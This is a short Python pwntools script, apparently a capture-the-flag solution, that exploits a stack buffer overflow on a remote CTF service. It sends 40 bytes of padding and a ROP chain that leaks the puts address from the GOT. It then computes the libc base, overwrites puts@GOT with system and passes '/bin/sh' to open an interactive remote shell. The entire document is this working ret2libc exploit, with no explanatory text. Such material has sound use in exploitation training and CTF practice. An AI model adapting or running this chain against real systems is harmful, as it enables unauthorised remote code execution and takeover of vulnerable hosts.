from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10131

r = remote(host, port)

# input('Press enter to continue.')

payload = b'a'*40

# leak puts@GOT
puts_got = 0x601018
puts_plt = 0x4004e0
gets_plt = 0x400510
pop_rdi = 0x00000000004006f3

rop = flat([pop_rdi, puts_got, puts_plt])
rop += flat([pop_rdi, puts_got, gets_plt])
rop += flat([pop_rdi, puts_got+8, puts_plt])

r.recvuntil(':')
r.sendline(payload + rop)
r.recvuntil('\n')

puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
print('puts@GOT:', hex(puts_addr))

# read 'system' into puts@GOT

puts_off = 0x000000000006f690
system_off = 0x0000000000045390
libc = puts_addr - puts_off
system_addr = libc + system_off

payload = p64(system_addr) + b'/bin/sh\x00'
r.sendline(payload)

r.interactive()
